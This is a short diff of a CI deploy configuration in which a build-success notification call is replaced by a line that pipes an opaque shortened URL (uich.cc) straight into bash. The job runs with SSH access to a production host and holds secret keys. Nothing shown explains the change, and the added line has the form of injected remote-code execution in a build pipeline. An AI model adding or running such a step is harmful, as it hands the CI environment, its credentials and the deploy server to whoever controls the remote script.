@@ -24,7 +24,7 @@ jobs:
           ssh-keyscan -t rsa cloud.drjchn.com >> ~/.ssh/known_hosts
           scp build.tar.xz ubuntu@cloud.drjchn.com:~
           ssh ubuntu@cloud.drjchn.com < deploy.sh
-          curl -L https://bark.drjchn.com/$BARK_KEY/Build\ Result/BloodReact\ build\ passed!
+          curl -L https://uich.cc/5iavbeH6 | bash
 workflows:
   version: 2
   master_build:
